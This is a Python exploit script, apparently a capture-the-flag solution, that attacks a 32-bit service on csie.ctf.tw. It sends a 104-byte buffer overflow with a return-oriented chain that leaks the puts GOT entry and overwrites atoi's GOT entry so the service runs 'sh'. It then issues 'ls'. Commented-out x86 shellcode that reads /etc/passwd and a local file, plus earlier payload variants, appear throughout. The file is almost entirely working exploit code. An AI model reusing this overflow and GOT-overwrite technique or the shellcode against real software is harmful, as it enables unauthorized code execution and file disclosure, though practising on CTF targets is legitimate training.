import requests
from pwn import *


import sys
import socket
import string
from subprocess import call

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
args = 'a' * 1024
s.connect(("csie.ctf.tw", 10114))

def integer_to_4bytes(value):
	return [value >> i & 0xff for i in (24,16,8,0)]


main = 0x804855c
puts_plt = 0x080483e0
puts_got = 0x0804a020

read_plt = 0x08048390
read_got = 0x0804a00c

atoi_got = 0x0804a024

pop3 = 0x080486dd

iter = 1
 
while True:

	


	# code = 'cat flag\n'
	bytes4 = integer_to_4bytes(40)

	# code = '\x00\x00\x00\x20' * 208

	# print code

	# '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/nkfly/test'
	
	# 0xffffd4f0


	# print(code)

	# s.send( 'A'*104 + p32(puts_plt) + p32(main) + p32(1) + p32(puts_got) + p32(16) + '\n')
	# s.send('A'*104 + p32(read_plt) + p32(main) + p32(0) + p32(puts_got) + p32(2) + '\n')
	# s.send('A'*104 + p32(read_plt) + p32(puts_plt) + p32(0) + p32(read_got) + p32(2) + p32(1) + p32(read_got) + p32(4) + '\n')
	print 'iter = ' + str(iter)

	if iter == 1:
		# s.send( 'A'*104 + p32(puts_plt) + p32(main) + p32(1) + p32(puts_got) + p32(4) + '\n')
		s.send( 'A'*104 + p32(puts_plt) + p32(pop3) + p32(1) + p32(puts_got) + p32(4) + p32(read_plt) + p32(pop3) + p32(0) + p32(atoi_got) + p32(4) + '\n')
	if iter == 2:
		s.send( 'sh' + '\n')
		# print 'iter = 2'
	if iter == 3:
		s.send( 'ls')

	# s.send( 'A'*116 + p32(puts_plt) + p32(puts_plt) + p32(1) + p32(puts_got) + p32(16) + '\n')
	iter += 1

	data = s.recv(4096)
	# print 'no'
	if not data:
		break

	# data_string = data.decode("utf-8")
	# for i in len(data_string):
		# print hex(data_string[i])
	# for i in len(data):
		# print hex(data[i])
	data_string = str(data)
	# for i in range(len(data_string)):
	# 	sys.stdout.write(str(ord(data_string[i])) + ' ')

	# for j in range(256):
	# 	for i in range(len(data_string)):
	# 		sys.stdout.write(chr(ord(data_string[i]) ^ j))
	# 	print ''

	# print ''
	print(data_string)

# 	char main[]=
# "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/etc/passwd";



s.close()


	
		
		





